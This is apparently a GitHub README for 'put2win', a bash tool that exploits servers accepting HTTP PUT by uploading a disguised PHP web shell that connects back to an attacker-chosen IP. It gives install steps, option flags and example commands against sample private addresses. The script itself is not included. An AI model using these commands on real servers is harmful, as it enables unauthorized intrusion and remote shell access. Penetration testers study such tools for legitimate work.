# put2win
[![contributions welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/dwyl/esta/issues)

Script to automate PUT HTTP method exploitation to get shell.

[![asciicast](https://asciinema.org/a/vw0wGOc6BmYIFoWKiY0YkanLb.svg)](https://asciinema.org/a/vw0wGOc6BmYIFoWKiY0YkanLb)


# Installation
```
git clone https://github.com/sysdevploit/put2win
cd put2win
chmod +x put2win.sh
```

# Usage
```
Script to automate PUT HTTP method exploitation to get shell.

Options:
  -t TARGET        Target URL/IP (e.g. 192.168.1.10)
  -p PORT          Target PORT (e.g. 8080)
  -u URL PATH      Path to save the shell (e.g. /uploads)
  -l LOCAL IP      IP where the shell will connect (e.g. 192.168.1.5)
  -s SHELL NAME    Shell name (e.g. license.php)

Examples of use:
 - bash put2win.sh -t 192.168.1.80 -l 192.168.1.10 -s readme.php
 - bash put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10
 ```
 
# Contact
Telegram: @devploit

Twitter: https://www.twitter.com/devploit
